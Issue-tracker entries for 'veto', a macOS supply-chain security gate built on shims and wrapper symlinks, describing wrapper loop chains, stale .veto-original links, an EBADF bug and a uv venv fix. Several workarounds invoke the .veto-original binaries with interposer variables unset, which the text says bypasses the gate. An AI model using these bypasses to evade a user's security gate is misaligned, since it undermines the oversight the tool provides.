Two real bugs in main's wrapper install/doctor surfaces. (A) install_wrappers.go:isWrappableTarget silently returns false on broken symlinks (EvalSymlinks fails on missing target), so install-wrappers can never wrap them and never tells the user, while doctor's Lstat-based surveyWrappablePaths surfaces them as 'NOT wrapped' forever. Concrete trigger on bryn's machine: a previously-installed tool called 'bouncer' left orphan symlinks pointing at a deleted binary. (B) install_wrappers.go:discoverWrapCandidates walks well-known roots only (homebrew, mise, asdf, pyenv, nvm, ~/.bun/bin), while doctor's surveyWrappablePaths additionally walks $PATH minus shim dirs. So ~/.cargo/bin/cargo, /usr/bin/pip3, etc. get warned about but install can never wrap them. Both bugs confirmed still live in main as of June 11 2026.

Fix shipped on branch wrapper-discovery-robustness (stale; branched from 2cc9251 pre-Hades merge). title: MOST CRITICAL: ~/.local/bin python shims have self-referential .veto-original siblings causing veto-as-python to stall, burning CPU indefinitely
description:
When ~/.local/bin/python3 (a Layer 2 shim) is invoked from certain spawn contexts (notably Claude Code's Bash tool), veto starts but never reaches syscall.Exec. The process stays as veto (lsof confirms txt = ~/.local/bin/veto after 56+ minutes), burning ~35% CPU per stuck process. Pyright's python-introspection helper triggered one such stall and ran for 56 min; subsequent benchmark invocations spawned more stuck processes.

The symptom is OBSERVED for veto invoked from Claude Code's Bash tool. The user reports that veto-as-python WORKS correctly from their interactive shell and from sirene-spawned shells. The differential needs investigation (likely env vector: DYLD_INSERT_LIBRARIES, VETO_PATH, PATH order, or stdio plumbing).

Two facts established by reading the source (cmd/veto/main.go) and inspecting the on-disk state:

1. The ~/.local/bin/python3*.veto-original symlinks all point to /Users/brynbellomy/.local/bin/veto (i.e., to veto itself). readlink -f confirms. These should not exist for Layer 2 shims; wrappers.json correctly has no entries for ~/.local/bin/. Likely stale from an older install-shims version.

2. findRealBinary (main.go:1293) HAS defenses against the loop — wrappers.json membership check + isSelfReferential guard (main.go:1271). Per the code, these siblings should be rejected and PATH walk should fall through to /opt/homebrew/bin/python3.veto-original (correctly registered, points to real ../Cellar/python@3.14/3.14.3_1/bin/python3).

Empirically: this fall-through is not happening (or stalls partway) when invoked from the Claude Code Bash tool. The exec never fires. Reproducer: from inside Claude Code, run ~/.local/bin/python3 -c 'print(1)' — exits 0 with no output. Real python at /opt/homebrew/bin/python3 prints '1' correctly.

Blast radius: every python3 invocation from agent Bash contexts (Claude Code, possibly other agent harnesses) becomes a stuck process burning a core. Cumulative effect: machine load can climb to 90-100% with multiple stuck veto-as-python processes accumulating from pyright LSP, subprocess.run benchmarks, etc.

This epic covers four child beads: (a) remove stale Layer 2 .veto-original siblings, (b) diagnose why the exec stalls in the Bash-tool spawn context, (c) add doctor check, (d) document the spawn-context differential.
close_reason: All four child beads landed: 12d832b (install-shims scrub + repair-shims, dzk.1), 19e55c6 (doctor row, dzk.3), 6d76cff (PATH-walk self-reference guard — root-cause fix, dzk.2), d09702f (postmortem doc + README, dzk.4). Verified end-to-end: timeout 5 ~/.local/bin/python3 -c 'print(1)' now exits 0 with output.

title: Stale .veto-original siblings in ~/.local/bin/ shim dir point to veto itself (should not exist for Layer 2 shims)
description:
On bryn's box: every ~/.local/bin/python3*.veto-original symlink (python3, python3.8, python3.10, python3.11, python3.12, python3.13, python3.14) points to /Users/brynbellomy/.local/bin/veto. readlink -f confirms self-referential resolution.

Layer 2 shims do not register entries in wrappers.json — that file only contains Layer 4 wrapped sites (mise, homebrew, cargo paths). So .veto-original siblings in the Layer 2 shim dir should not exist at all. Their existence here is a stale artifact, likely from an earlier install-shims version that created them and a later version that stopped removing them.

The runtime safeguards in findWrappedOriginal (main.go:1243) and findRealBinary (main.go:1293) correctly REFUSE to trust these unregistered siblings — both the wrappers.json membership check and isSelfReferential guard catch them. So in pure code terms, the siblings should be harmless.

BUT they are a footgun:
- They confuse human operators reading the install state.
- They suggest a Layer 4 wrap exists when it does not.
- They are likely a contributing factor in the stall described in the parent epic, even if the code path technically rejects them — something else downstream may still depend on the disk state being consistent.

Fix (one of):
1. install-shims should explicitly remove any *.veto-original siblings from the shim dir on every run (cleanup pass before/after creating the canonical shim symlinks).
2. A new 'veto repair-shims' command that scrubs them, parallel to 'veto repair-wrappers'.
3. veto doctor flags their presence with a one-line fix suggestion.

The user's machine is in this state right now. Reproducer for tests: ls -la ~/.local/bin/python3*.veto-original on a box that has had install-shims run multiple times across veto versions.

Acceptance: after the fix runs (install-shims --force or repair-shims), no .veto-original siblings exist in the shim dir; veto doctor goes green; the parent epic's stall reproducer no longer hangs (or, if it still hangs, this bead is closed independently because the disk state is clean even if the deeper bug remains).

title: veto-as-python3 never reaches syscall.Exec when invoked from Claude Code Bash tool — process stays as veto burning CPU
description:
Concrete observation. lsof on a stuck process invoked as 'python3 -I -c ...' by pyright-langserver shows the txt segment is /Users/brynbellomy/.local/bin/veto. The process has been running for 56 minutes at ~35% CPU. Veto is supposed to call syscall.Exec on the real interpreter and have its process image replaced; instead it stays as veto indefinitely.

Per the code in cmd/veto/main.go:

Line 130 if isPythonBasename(self) → true for python3
Line 142-152 the non--m branch: loadConfig() then execReal(cfg, self, args)
Line 1107 execReal → execRealWithEnv → findRealBinary → syscall.Exec

The fail-safes upstream (findWrappedOriginal returning false for unregistered ~/.local/bin/python3.veto-original; isSelfReferential catching the same; PATH walk skipping veto-pointing entries) all behave correctly per the code. So the resolved realPath when invoked from PATH walk should be /opt/homebrew/bin/python3.veto-original (registered wrapper), and syscall.Exec(realPath, argv, env) should fire.

But empirically: it does not. lsof keeps reporting the veto binary as txt. The process pegs CPU. There is no log output even with VETO_LOG=debug.

Possibilities to investigate:
1. loadConfig() (viper config) is hanging on file IO or env-var parsing in some pathological state.
2. syscall.Exec fails silently (returns an error that is being swallowed). Line 1119 has fmt.Fprintf to stderr, but stderr might be closed or redirected to /dev/null in the spawn context.
3. The findRealBinary PATH walk has a bug for the specific case where every PATH entry that has python3 IS veto (loops through all candidates, every one is a registered wrapper, returns the first registered sibling). My PATH order has ~/.local/bin first (NOT registered, falls through), then several mise/go/zig dirs without python, then /opt/homebrew/bin (registered, has python3.veto-original sibling). The walk should reach /opt/homebrew/bin and return its sibling.
4. The Bash-tool spawn environment is missing something veto needs (e.g., a specific stdio state, or has an env var set that causes hangs in viper).
5. The DYLD_INSERT_LIBRARIES dylib (libveto_interpose.dylib, Layer 3) might be hooking into the spawned process and causing a recursion loop on its own execve syscalls. The interposer reads VETO_PATH; veto inherits VETO_PATH; child python sees VETO_PATH unset (per sanitizedEnv line 1180) which disables the interposer. But maybe sanitizedEnv is not applied in the python non--m path. Looking at execRealWithEnv line 1111 it does pass sanitizedEnv(os.Environ()) — so VETO_PATH should be stripped before the child exec.

Diagnostic path:
1. From a confirmed-broken spawn context, run with strace/dtruss to see where the exec stalls. dtruss -f -t execve <invocation> with sudo will show the syscall sequence.
2. Add stderr writes to execReal before and after the syscall.Exec call (and to loadConfig) to bisect where it hangs.
3. Compare env vector between Claude Code Bash spawn vs interactive shell vs sirene shell. The interactive shell works; the agent shell stalls. The differential is the bug surface.

This is the load-bearing bug — the broken siblings in the sister bead are cosmetic compared to this.

Fix mirrors the guard in the PATH-walk branch. Verified: timeout 5 ~/.local/bin/python3 -c 'print(1)' now prints 1 and exits 0 from Claude Code Bash spawn context.

title: make build produces veto binary with broken networking (EBADF on connect)
description:
## Summary

`make build` produces a veto binary whose networking is broken — `connect(2)` returns EBADF on every outbound TCP dial. A binary built from the same source with the same flags via direct `go build` (bypassing the Makefile) works perfectly.

## Reproduction

```sh
cd ~/projects/veto
make clean && make build
./veto sync   # → EBADF on every intel source fetch
```

vs:

```sh
cd ~/projects/veto
env -u DYLD_INSERT_LIBRARIES -u VETO_PATH \
  /Users/brynbellomy/.local/share/mise/installs/go/1.26.4/bin/go.veto-original \
  build -trimpath -ldflags='-s -w -X main.version=test' -o /tmp/veto-good ./cmd/veto
/tmp/veto-good sync   # → works, 14 sources fresh, 0 failures
```

Both built from commit 2b28d87, go1.26.4, darwin/arm64. Different SHA hashes:

- `make build` output: `ebb0964...` (broken)
- manual `go build` output: `516c3a6...` (works)

## Symptoms

- `veto sync` fails with `dial tcp <ip>:443: connect: bad file descriptor` on every source
- `veto doctor` fails the same way
- `go run ./cmd/cachet` via the veto shim inherits the broken networking → cachet's DB dial gets EBADF
- The EBADF is intermittent for downstream programs (cachet sometimes connects, sometimes doesn't) but consistent for veto's own intel refresh

## What I ruled out

1. **Not the dylib.** Tested `go run dialtest.go` with `DYLD_INSERT_LIBRARIES` explicitly set — networking works fine. The dylib hooks execve/posix_spawn only, not socket/connect.
2. **Not `-trimpath` or `-ldflags='-s -w'` individually.** Building with each flag alone produces a working binary.
3. **Not the go build cache.** `go clean -cache` + `make build` still produces a broken binary.
4. **Not go generate.** Running `go generate ./internal/interposer/gen/...` then `go build` manually works fine.
5. **Not codesign/entitlements.** Both binaries are adhoc-signed with no entitlements.
6. **Not the go version.** Both built with go1.26.4.

## What's different

The `make build` target:
1. Runs `go generate ./internal/interposer/gen/...` (via the `.PHONY` `$(INTERPOSER_HEADER)` prereq)
2. Runs `go build -trimpath -ldflags="..." -o veto ./cmd/veto`

But crucially, `make` runs these without `env -u DYLD_INSERT_LIBRARIES -u VETO_PATH`. So `go build` resolves via PATH to the veto shim (`~/.local/bin/go → veto`). veto intercepts `go build`, runs its gate (including the EBADF-ing intel refresh), then execs the real go binary with `go build` classified as `RecursionRiskLow` → VETO_PATH preserved in child.

When I run `go build` manually with `env -u`, it bypasses the veto shim entirely.

**The working hypothesis:** something about running `go build` through veto's exec chain (dylib loaded, VETO_PATH set, veto gate having just run) produces a different binary than running `go build` directly. The mechanism is unclear — go build shouldn't produce different output based on the parent process's env — but the hashes differ and the behavior differs.

## Impact

- `make install` and `make build` produce a broken veto binary
- Any go program launched via the veto shim (`go run`, `go test`) may inherit broken networking
- The installed `~/.local/bin/veto` is broken (built via `make install`)

## Acceptance Criteria

- [ ] `make build` produces a veto binary that can `veto sync` without EBADF
- [ ] `make build` output hash matches a manual `go build` with identical flags from the same source
- [ ] Identify the mechanism by which the veto-shim-mediated `go build` differs from a direct `go build`

## Workaround

Build and install veto directly, bypassing the Makefile:
```sh
env -u DYLD_INSERT_LIBRARIES -u VETO_PATH \
  /Users/brynbellomy/.local/share/mise/installs/go/1.26.4/bin/go.veto-original \
  build -o ~/.local/bin/veto ./cmd/veto
```

comments.author: bryn
comments.text:
Update: the binary identity is path+name-dependent, not just make-vs-manual.

Key finding: the SAME binary (identical SHA) behaves differently depending on its filename:
- `~/.local/bin/veto` (named `veto`) → EBADF on intel fetches (falls back to cache, sync succeeds but with warnings)
- `~/.local/bin/veto-test` (same file, different name) → no EBADF, clean sync
- `/tmp/veto-fresh` → no EBADF, clean sync

This means the EBADF is triggered by the dylib's behavior when loaded into a process named `veto`. The dylib checks `!strcmp(bn, "veto")` in is_risky() to avoid recursion, but something about the interpose hooks firing in a `veto`-named process still corrupts socket fds.

The `make build` correlation was a red herring — make-built and manually-built binaries both work fine when copied to a non-`veto` path. The actual issue is the dylib + binary name `veto`.

Downstream impact on cachet: `go run ./cmd/cachet` invokes the veto shim, veto runs (with EBADF on its own intel refresh but falls back to cache), then veto execs the real go binary with VETO_PATH preserved (go run = RecursionRiskLow). The child go process has the dylib loaded and VETO_PATH set. That child's networking is what gets EBADF on DB dial.

Workaround: run cachet via the real go binary directly:
  env -u DYLD_INSERT_LIBRARIES -u VETO_PATH \
    /Users/brynbellomy/.local/share/mise/installs/go/1.26.4/bin/go.veto-original \
    run ./cmd/cachet

title: Wrapper Layer-4 hardening: prevent breakage + repair affected users
description:
Real users may already be in a broken state after running 'veto install-wrappers' on any system with a sibling-symlink package-manager alias (bun+bunx, rustup-multiplexed cargo, npm+npx in some layouts, uv+uvx, ...). The pmsurvey merge (6d77bc3) surfaced the latent bug by making the symptom visible (SKIP/FAIL lines), but the underlying breakage is older: pre-merge install-wrappers would have wrapped both alias and target, producing an infinite-loop wrapper chain (alias.veto-original is a symlink to target, which is now veto). The user observed this on their own machine running 'bun install' — bunx is now functionally broken after bun was wrapped.

This epic ships the full fix in two tracks, neither of which requires reverting the merge.

**Prevent track — for new install-wrappers runs.**

  - ynv.4 (P1, was P2): sibling-multiplexer wrap. When applyWrapper sees a candidate whose resolved target is another candidate in the same batch, after wrapping the target, the alias is wrapped with its .veto-original as a hardlink (or symlink) to the target's .veto-original. Both alias and target end up gated; alias.veto-original points at the real binary directly, bypassing the now-poisoned target symlink. Also fixes the stale-classification bug (re-classify at apply time, OR sort candidates target-first).

  - ynv.2 (P2): rustup multiplexer + walk ~/.rustup/toolchains/*/bin. Same abstract pattern as ynv.4 but cross-directory: cargo→rustup→ exec real cargo in toolchain dir. pmsurvey.WellKnownBinDirs grows rustup-toolchains entries; pmsurvey.Classification optionally grows ClassMultiplexer for known multiplexers so the SKIP message stops suggesting --force.

  - ynv.1 (P3): EROFS / read-only-filesystem detection — FAIL → SKIP-with-SIP-hint.

  - ynv.3 (P3): SKIP message detects actual <path>.*-original sibling and names it (not the hardcoded .veto-original hint).

**Repair track — for users already affected.**

  - 'veto repair-wrappers' command: detect + heal broken wrapper states. Iterates wrappers.json entries; for each, classify the on-disk state via pmsurvey.ClassifySymlink. Heals three patterns: (1) loop chain (alias.veto-original is a symlink that resolves back to veto — fix by relinking to target.veto-original); (2) missing .veto-original (wrapper site has no original — fix by detecting alias relationship and linking through, OR by unwrapping the broken site); (3) broken-target chains where the symlink resolves nowhere. Modes: --dry-run (default — shows planned repairs), --apply. Idempotent. Outputs a per-site verdict matching install-wrappers' format.

  - doctor: detect loop-chain wrapper states. For each registered wrapper, additionally verify the .veto-original chain doesn't resolve back to veto. If it does, FAIL with 'wrap chain loops; run veto repair-wrappers'. Surfaces the diagnosis without requiring users to know to run repair.

**Awareness track — for everyone.**

  - README: upgrade banner at top per CLAUDE.md ('there should always be a suggested command set near the top of the file for upgrading an existing installation'). Two-line command set: 'make install && veto repair-wrappers && veto install-all'. Plus a paragraph naming the sibling-multiplexer issue and pointing at the repair command.

  - install-all: surface a repair recommendation. After the install-wrappers step, if any SKIP-broken/SKIP-foreign-wrapper lines appeared OR wrappers.json contains any pre-existing loop chain, install-all prints a 'recommend: veto repair-wrappers' line in the final summary. Optionally auto-run repair (--auto-repair flag, off by default for safety).

  - Integration test fixtures: bun+bunx layout (sibling alias), rustup+cargo layout (cross-dir multiplexer), broken-symlink leftover (.bouncer-original style), multi-version mise (e.g. uv 0.8.12 + 0.8.13), read-only-filesystem (SIP-shape) test in CI. Catch regressions before users hit them.

**Acceptance criteria.**

1. On bryn's machine: 'veto install-all' (after the fix) produces zero broken state. 'bunx --version', 'bun --version', 'uv --version', 'uvx --version', 'cargo --version' all run normally and route through veto where appropriate.
2. 'veto repair-wrappers' on a synthesized loop chain (alias.veto-original → target → veto) reports the loop in --dry-run, fixes it under --apply, and 'doctor' goes green.
3. 'veto doctor' on a loop-chain state FAILs with the loop-chain diagnosis, not a generic OK.
4. README's upgrade-instructions block lands at the top of the file.
5. CI has at least one test exercising bun+bunx and one exercising rustup+cargo layouts.

**Out of scope (file as separate beads if pursued).** A formal CHANGELOG / RELEASE_NOTES file. A migration tool for users on very old veto versions. Telemetry to detect affected users.

title: veto repair-wrappers: detect + heal broken wrapper states (loop chains, missing originals, leftovers)
description:
New top-level CLI verb 'veto repair-wrappers' that iterates wrappers.json and on-disk state to find broken wrapper layouts and heal them.

Detection patterns:

  1) **Loop chain** — wrapper site (e.g. /…/bunx) where the .veto-original sibling resolves back to a veto binary (because the sibling is a symlink to another wrapper site that's now veto). Heal: detect that the loop's first non-veto ancestor is another registered wrapper's .veto-original; relink the alias's .veto-original directly to that real binary (hardlink preferred for atomicity; symlink fallback).

  2) **Missing .veto-original** — wrapper site that's a veto symlink but the .veto-original sibling doesn't exist. Heal: detect alias relationship via pmsurvey, link through; OR if no alias relationship can be reconstructed, unwrap the site (rm the veto symlink, leave the path empty so the next install-wrappers run can re-discover and wrap correctly).

  3) **Broken-target alias** — wrapper-adjacent symlink (alias of a real binary that's been removed). Surface, don't auto-fix (out of scope unless a user-confirmed cleanup is desired).

Modes: --dry-run (default — verdict per site, no mutation); --apply (perform repairs). Per-site output mirrors install-wrappers' format ('PASS', 'REPAIR — <description>', 'SKIP — <reason>', 'FAIL — <reason>'). Idempotent: running --apply twice in a row leaves state unchanged on the second run.

Depends on veto-ynv.4 landing (re-classification at apply time + sibling-multiplexer wrap semantics) — repair needs the same classifier the new install path uses.

Acceptance: bryn's machine — after running repair-wrappers under --apply, 'bunx --version' succeeds, 'doctor' is green, 'install-wrappers' is a no-op.

title: doctor: detect loop-chain wrapper states + diagnose with repair-wrappers hint
description:
Extend checkWrappers (or its rewired *With variant) to verify, for each registered wrapper, that its .veto-original chain does NOT resolve back to a veto binary. Today's pmsurvey.ClassifySymlink returns ClassOursByPath/Hash for the wrapper site itself, but doesn't check the .veto-original chain — so a loop state is silently 'PASS'.

Implementation: add pmsurvey.ClassifyOriginalChain(originalPath, *VetoIdentity) (or inline in checkWrappersWith): EvalSymlinks the original; if it resolves to a path that is itself a registered wrapper (or veto's binary directly), classify as ClassLoopChain. Emit a doctor FAIL with detail: '<path>.veto-original resolves back to veto via <chain> — wrap chain loops; run veto repair-wrappers' and howToFix pointing at the new command.

Depends on veto-h1u.<repair-wrappers id> existing so the howToFix references a real command.

Acceptance: synthesised loop chain (planted in a tempdir fixture) produces a doctor FAIL with the loop-chain wording. bryn's machine: post-repair, doctor's loop-chain check passes.

description:
Per CLAUDE.md: 'README.md should always be reflective of capabilities. it must offer a thorough onboarding to the tool for new and existing users (veto iterates quickly -- there should always be a suggested command set near the top of the file for upgrading an existing installation).'

description:
After the install-wrappers step in 'veto install-all', detect whether any sites need repair: scan wrappers.json + on-disk state via pmsurvey.ClassifySymlink, look for the patterns repair-wrappers heals (loop chains, missing originals). If any found, install-all's final summary surfaces a high-visibility line: 'WARN: <N> wrapper sites need repair; run 'veto repair-wrappers' to heal'. Optional --auto-repair flag to perform repair inline (default off for safety; users can opt in once they trust the repair tool).

Why this matters: per CLAUDE.md, 'veto install* commands (especially veto install-all) must always do what they claim'. install-all's job is 'bring this host to a fully-protected state.' If a sibling-multiplexer is in a broken-or-degraded state, install-all should surface that, not silently leave the user in a half-broken posture.

title: Integration test fixtures: bun+bunx, rustup+cargo, multi-version mise, bouncer-leftover, SIP read-only-fs
description:
Add integration tests under cmd/veto and internal/packagemanager/pmsurvey that exercise the wrapper-install / classify / repair flow against realistic on-disk layouts. Catch regressions before users do.

Fixtures to plant in tempdirs:

  1) **bun + bunx mise layout**: /tmp/x/.local/share/mise/installs/bun/1.3.6/bin/{bun (real Mach-O stub), bunx (symlink to ./bun)}. After install-wrappers, both wrapped; bunx.veto-original resolves to the real bun binary (not back to veto).

  2) **rustup multiplexer**: /tmp/x/.cargo/bin/{cargo (symlink to rustup), rustup (real Mach-O stub)}, plus /tmp/x/.rustup/toolchains/stable-aarch64-apple-darwin/bin/cargo (real Mach-O stub). install-wrappers wraps the toolchain cargo, classifies ~/.cargo/bin/cargo as ClassMultiplexer (skip with multiplexer-aware message).

  3) **Multi-version mise**: uv 0.8.12 + uv 0.8.13 both present. Both wrapped independently.

  4) **Bouncer-style leftover**: broken symlink to /tmp/x/.local/bin/missing-tool, with a sibling <path>.foo-original real binary. install-wrappers SKIPs with the message naming '.foo-original' specifically (per veto-ynv.3).

  5) **SIP-shape read-only filesystem**: a chmod-readonly directory simulating /usr/bin. install-wrappers SKIPs with the SIP-protected hint (per veto-ynv.1).

  6) **Loop-chain pre-existing state** (input fixture for repair): planted by hand to mimic what an upgrading user would have. repair-wrappers heals; doctor goes green.

Use t.TempDir + t.Setenv to isolate from the test runner's host. Stub binaries are 'echo' shell scripts marked executable — small enough not to bloat fixtures.

Acceptance: all 6 fixtures have a corresponding Go test that exercises install-wrappers → classify → (optional repair-wrappers) → doctor flow and asserts the expected end state. CI runs them on every PR.

The exact bug that broke bryn's box during veto-dzk recovery: wrappers.json contained entries for ~/.local/bin/* paths (Layer 2 shim dir). repair-shims removed the .veto-original siblings but left the wrappers.json entries. veto doctor then FAILed those entries as 'wrapper:* .veto-original missing', and its prescribed recovery (uninstall-wrappers && install-wrappers) deleted the Layer 2 shims themselves because uninstall-wrappers blindly followed the bogus entries.

Fix: install-shims must, in addition to creating canonical shim symlinks, scan wrappers.json and remove any entry whose 'path' lies inside the shim dir (cleanShimDir + filepath.HasPrefix check). Layer 2 shims and Layer 4 wraps must not share territory.

Defense in depth: install-wrappers candidate-discovery should also refuse to enroll a path inside the shim dir as a wrap candidate. Currently it does — but somehow these entries got there. Investigate how they were enrolled and add a guard.

Acceptance:
- After install-shims runs, no wrappers.json entry has 'path' inside ~/.local/bin/ (or whatever shim dir is configured).
- Test fixture: planted wrappers.json with bogus shim-dir entries → install-shims removes them, untouched legit entries remain.
- veto doctor on bryn's broken-from-veto-dzk state, after a single install-shims, reports no FAIL rows for shim siblings or shim-dir wrappers.

title: veto uv run cannot use existing venvs — python shim breaks uv interpreter inspection
description:
## Problem

`veto uv run` cannot target an existing venv. uv inspects the venv's `bin/python` to confirm it's a usable interpreter, but veto installs that binary as a symlink to `veto` (which uv cannot execute as a Python interpreter), so uv fails with:

```
error: Failed to inspect Python interpreter from provided path at `…/.venv/bin/python`
  Caused by: Querying Python at `…/.venv/bin/python` failed with exit status exit status: 70
[stderr]
veto: cannot find real python: not found in PATH
```

This forces every `veto uv run` invocation to create a fresh throwaway venv (resolving to whatever default python uv picks — currently 3.14 on this machine), which means project venvs with already-installed heavy deps (scipy, numpy, asyncpg, etc.) are unusable through the gate.

## Repro

```
$ veto uv run --python /path/to/project/.venv/bin/python python -m pytest
error: Failed to inspect Python interpreter from provided path …
veto: cannot find real python: not found in PATH
```

## Impact

- Any project with a pre-existing uv venv (i.e. the normal case) cannot run commands through `veto uv run` against that venv.
- Workaround currently requires invoking the pre-shim binary directly (`…/python3.12.veto-original`) with `PYTHONPATH` manually pointing at the venv's site-packages, which bypasses the gate entirely.
- Blocks running tests, linters, migrations, scripts — anything that lives in a project venv — through veto.

## Suspected root cause

veto's shim strategy replaces `python`/`python3`/`python3.x` in the venv's `bin/` with symlinks to the `veto` binary itself. When a package-manager tool (like uv) tries to *inspect* that binary as a Python interpreter (rather than *execute* a command through it), veto responds with its own error message instead of behaving as python. uv's interpreter probe expects to run `python -c "…"` and parse stdout; it gets veto's stderr instead.

The `.veto-original` real binary is preserved alongside the shim, so a fix is likely: detect when veto is being invoked in an interpreter-probe context (e.g. argv contains `-c`, `--version`, `-V`, or stdin is being piped a probe) and exec the real binary directly, OR have veto expose the real binary path via an env var / known suffix that tools can resolve.

## Environment

- veto repo: `~/projects/veto` (commit as of 2026-07-10)
- uv: 0.8.13
- python: uv-managed cpython 3.12.11 at `/Users/brynbellomy/.local/share/uv/python/cpython-3.12.11-macos-aarch64-none/bin/python3.12.veto-original`
- os: macOS aarch64

## Worth Remembering

- the `.veto-original` suffix is the escape hatch — it's the un-shimmed binary.
- this was discovered while trying to run worker-metrics pytest through `veto uv run`; veto's supply-chain gate is otherwise working (it blocked the pip install attempt when i tried to pass `python -c '…'` as a requirements arg, correctly failing-closed).
close_reason: Fixed in commit 2b28d87 on branch fix/uv-venv-python-shim-chain-0w8. Root cause: findWrappedOriginal did not walk the symlink chain from argv[0], so a venv whose bin/python chains through a registered Layer 4 wrap site (canonical uv cpython) could not resolve. Fix walks the chain with provenance + self-reference guards at every step. 3 regression tests added. Full cmd/veto suite passes.

comments.author: ${BR_ACTOR:-assistant}
comments.text:
Investigated and fixed.

Reproduced the exact error against a venv whose bin/python chains through the canonical uv cpython (the normal uv-managed venv shape):

  error: Failed to inspect Python interpreter from provided path at .../.venv/bin/python
  veto: cannot find real python: not found in PATH

Root cause differs from the bead's suspected diagnosis. The bead proposed detecting interpreter-probe invocations (-c/-V/--version) and exec'ing the real binary directly. That would NOT have fixed it — the real binary IS findable, the resolver just wasn't looking in the right place.

Actual bug: findWrappedOriginal (cmd/veto/main.go) checked only the starting argv[0] path for a registered .veto-original sibling. The venv's bin/python path is NOT in wrappers.json (it's not a wrap site), so the check failed and fell through to the PATH walk. The PATH walk found only Layer 2 shims (which are veto itself → skipped). The canonical uv cpython binary at the far end of the symlink chain IS a registered Layer 4 wrap site with a .veto-original sibling, but the resolver never followed the chain to discover it.

Fix: findWrappedOriginal now walks the symlink chain. At each step, if the current path is registered in wrappers.json AND has an executable .veto-original sibling (non-self-referential), it returns that sibling. Provenance holds at every step — unregistered paths with planted siblings are ignored, so an attacker planting a .veto-original anywhere along the chain cannot hijack resolution. The self-reference guard fires at each candidate, closing the same exec-loop hazard the original defended against.

Verified end-to-end: `veto uv run --python .../.venv/bin/python python -V` now returns `Python 3.12.11` instead of the error.

Committed on branch fix/uv-venv-python-shim-chain-0w8 in worktree /tmp/veto-0w8. Full cmd/veto test suite passes (including 3 new regression tests for the chain-walk path, the unregistered-sibling-not-honored property, and the self-referential-sibling-rejected property).

Separate issue surfaced during investigation (not blocking, not fixed here): `veto uv run ... python -c 'print(1+1)'` fails because uv's ParseInstalls treats `-c 'print(1+1)'` as a requirements file path. This is a different bug in the uv PM parser, pre-existing, unrelated to 0w8.

title: Move wrappers.json from ~/.cache/veto to a spec-correct state directory
description:
wrappers.json currently lives at ~/.cache/veto/wrappers.json (or $XDG_CACHE_HOME/veto/). The XDG spec says ~/.cache is for non-essential regenerable data, but wrappers.json is a load-bearing ledger of mutations veto made to the system (every Layer-4 wrap site). It gets chmod 0o700 on save specifically because it's a trust root — that's config-adjacent behavior in a cache-designated directory.

The self-healing in install-wrappers (discovery reconciles on-disk reality into state) means a cache wipe is survivable: the next install-wrappers pass rediscovers every pointsAtVeto + .veto-original pair and rewrites the registry. Between the wipe and the next install pass, Layer-4 absolute-path invocations lose their provenance gate and fall through to PATH lookup — they still work if an unwrapped binary exists elsewhere on PATH, they just don't get the sibling fast-path. Bare-name invocations via Layer-2 shims are entirely unaffected (basename dispatch in main() doesn't touch wrappers.json).

The failure mode that ISN'T survivable is corrupt-but-present JSON — loadWrapperState returns an error and install-wrappers refuses to proceed ('refusing to overwrite a load-bearing registry'). Missing file = clean slate = self-heal. So the directory choice is a cosmetically-wrong label on a file that doesn't depend on its location for correctness, but it does create a narrow failure surface: user nukes ~/.cache AND doesn't run veto install-all afterward.

Proposed change:
  1. Move wrappers.json to ~/.local/state/veto/wrappers.json (XDG_STATE_HOME is the spec-correct home for 'data that records what the program did to the system and needs to survive a cache wipe but isn't user-authored config'). This is where nix keeps profile manifests, pip keeps installer records, etc.
  2. Add VETO_STATE_DIR (default ~/.local/state/veto) alongside VETO_CACHE_DIR. Two env vars, two directories, spec-clean semantics. VETO_CACHE_DIR continues to move only the intel cache.
  3. One-shot migration: on first run under the new code, if ~/.cache/veto/wrappers.json exists and ~/.local/state/veto/wrappers.json doesn't, move it. Idempotent.
  4. doctor: flag any wrappers.json found in the old cache location after migration as 'stale registry location; re-run veto install-all to migrate'.

Files to touch: cmd/veto/main.go (defaultStateDir), cmd/veto/install_wrappers.go (loadWrapperState / saveWrapperState path resolution), cmd/veto/doctor.go (stale-location check), new migration code in the install-all convergence path.

Acceptance:
  - wrappers.json lives at ~/.local/state/veto/wrappers.json on a fresh install.
  - Existing install: veto install-all migrates the file once, leaves a doctor-clean state.
  - VETO_STATE_DIR override moves only the registry; VETO_CACHE_DIR moves only the intel cache.
  - doctor flags a stale cache-location registry after migration if one reappears.
  - All existing wrappers.json tests pass against the new location.

Not urgent — self-healing is the real safety net. This is polish that buys robustness against the specific 'rm -rf ~/.cache' failure mode.

title: install-wrappers: detect read-only filesystem (EROFS) and emit SKIP-not-FAIL
description: Symptom: 'veto install-all' attempts to wrap /usr/bin/pip3 on macOS, fails with 'read-only file system', and emits FAIL — but /usr/bin is SIP-protected and cannot be wrapped under any circumstances (sudo cannot write to it either). The existing wrapperActionSkipUnwritable branch in applyWrapper catches os.IsPermission errors but not EROFS / read-only filesystem errors. Fix: catch syscall.EROFS (or errors.Is with the equivalent macOS error) in applyWrapper's rename step; map to wrapperActionSkipUnwritable (or a new wrapperActionSkipReadOnlyFS) with a SIP-protected hint. Acceptance: install-all on macOS produces a SKIP line for /usr/bin/pip3 with hint 'read-only filesystem; SIP-protected on macOS; no action needed', not a FAIL. title: install-wrappers: walk ~/.rustup/toolchains/*/bin and treat ~/.cargo/bin/cargo as multiplexer
description: Symptom: 'veto install-all' classifies ~/.cargo/bin/cargo as ClassForeignWrapper because it's a symlink to ~/.cargo/bin/rustup (Mach-O; SHA-256 != veto). It's not actually a foreign wrapper — it's the standard rustup multiplexer: cargo→rustup→argv[0]-based dispatch→real cargo at ~/.rustup/toolchains/<v>/bin/cargo. The SKIP hint suggests '--force to overwrite' but --force would break rustup's dispatch and is the wrong action. Fix has two parts: (1) extend pmsurvey.WellKnownBinDirs to walk ~/.rustup/toolchains/<v>/bin for real cargo/rustc/rustfmt binaries; install-wrappers wraps THOSE; (2) optional: pmsurvey.Classification grows ClassMultiplexer for known multiplexers (rustup symlinks, pyenv shims, etc.) so the SKIP message stops suggesting --force and instead says 'multiplexer; veto wraps the dispatched binary downstream'. Acceptance: cargo at ~/.rustup/toolchains/stable-*/bin/cargo wrapped after install-wrappers; ~/.cargo/bin/cargo skipped with a multiplexer-aware message; no --force suggestion. Repro: bryn's box; install-all output 2026-06-11.

title: install-wrappers SKIP message: detect actual <path>.<tool>-original sibling, name it specifically

